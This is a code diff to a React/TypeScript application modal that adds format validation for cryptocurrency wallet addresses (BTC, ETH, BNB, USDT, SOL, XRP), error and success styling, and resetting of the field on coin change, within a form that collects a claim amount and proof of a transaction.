@@ -45,6 +45,18 @@ const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
 
 const isValidEmail = (value: string) => EMAIL_REGEX.test(value.trim());
 
+const WALLET_REGEX: Record<string, RegExp> = {
+  BTC:  /^(1|3)[a-zA-Z0-9]{24,33}$|^bc1[a-zA-Z0-9]{6,87}$/,
+  ETH:  /^0x[a-fA-F0-9]{40}$/,
+  BNB:  /^bnb1[a-z0-9]{38}$/,
+  USDT: /^0x[a-fA-F0-9]{40}$/,
+  SOL:  /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
+  XRP:  /^r[a-zA-Z0-9]{24,33}$/,
+};
+
+const isValidWallet = (address: string, coin: string) =>
+  WALLET_REGEX[coin]?.test(address.trim()) ?? false;
+
 interface ApplicationModalProps {
   open: boolean;
   onOpenChange: (open: boolean) => void;
@@ -58,6 +70,7 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
   const [email, setEmail] = useState("");
   const [emailTouched, setEmailTouched] = useState(false);
   const [walletAddress, setWalletAddress] = useState("");
+  const [walletTouched, setWalletTouched] = useState(false);
   const [selectedCoin, setSelectedCoin] = useState("BTC");
   const [claimAmountUsd, setClaimAmountUsd] = useState(2500);
   const [proofFile, setProofFile] = useState<File | null>(null);
@@ -83,13 +96,17 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
   const emailValid = isValidEmail(email);
   const showEmailError = emailTouched && !emailValid;
 
-  const canApply = fullName.trim() && emailValid && walletAddress.trim();
+  const walletValid = isValidWallet(walletAddress, selectedCoin);
+  const showWalletError = walletTouched && !walletValid;
+
+  const canApply = fullName.trim() && emailValid && walletValid;
   const canSubmitProof = txHash.trim() || proofFile;
 
   const handleApply = () => {
-    // Always mark touched so the error surfaces if user skipped the field
+    // Always mark touched so errors surface if user skipped fields
     setEmailTouched(true);
-    if (!emailValid) return;
+    setWalletTouched(true);
+    if (!emailValid || !walletValid) return;
     setStep(1);
   };
 
@@ -131,6 +148,7 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
       setEmail("");
       setEmailTouched(false);
       setWalletAddress("");
+      setWalletTouched(false);
       setSelectedCoin("BTC");
       setClaimAmountUsd(2500);
       setProofFile(null);
@@ -244,7 +262,11 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                   {coins.map((c) => (
                     <button
                       key={c.symbol}
-                      onClick={() => setSelectedCoin(c.symbol)}
+                      onClick={() => {
+                        setSelectedCoin(c.symbol);
+                        setWalletAddress("");
+                        setWalletTouched(false);
+                      }}
                       className={`glass-card rounded-lg px-3 py-2 text-sm font-medium transition-all ${
                         selectedCoin === c.symbol
                           ? "border-primary text-primary ring-1 ring-primary"
@@ -257,20 +279,50 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                 </div>
               </div>
 
-              {/* Wallet address */}
+              {/* Wallet address with validation */}
               <div>
                 <label className="text-sm text-muted-foreground mb-1.5 block">
                   Your {selectedCoin} Wallet Address
                 </label>
-                <div className="flex items-center gap-2 glass-card rounded-lg px-3 py-2.5">
-                  <Wallet className="h-4 w-4 text-muted-foreground shrink-0" />
+                <div
+                  className={`flex items-center gap-2 glass-card rounded-lg px-3 py-2.5 transition-colors ${
+                    showWalletError
+                      ? "border-destructive ring-1 ring-destructive/50"
+                      : walletTouched && walletValid
+                      ? "border-success/50"
+                      : ""
+                  }`}
+                >
+                  <Wallet
+                    className={`h-4 w-4 shrink-0 transition-colors ${
+                      showWalletError
+                        ? "text-destructive"
+                        : walletTouched && walletValid
+                        ? "text-success"
+                        : "text-muted-foreground"
+                    }`}
+                  />
                   <input
                     value={walletAddress}
                     onChange={(e) => setWalletAddress(e.target.value)}
+                    onBlur={() => setWalletTouched(true)}
                     placeholder="Enter your wallet address"
                     className="bg-transparent text-foreground text-sm outline-none flex-1 placeholder:text-muted-foreground/50 font-mono"
                   />
+                  {walletTouched && (
+                    walletValid ? (
+                      <CheckCircle2 className="h-4 w-4 text-success shrink-0" />
+                    ) : (
+                      <AlertCircle className="h-4 w-4 text-destructive shrink-0" />
+                    )
+                  )}
                 </div>
+                {showWalletError && (
+                  <p className="text-xs text-destructive mt-1.5 flex items-center gap-1">
+                    <AlertCircle className="h-3 w-3" />
+                    Enter a valid {selectedCoin} wallet address
+                  </p>
+                )}
               </div>
 
               {/* Claim amount */}
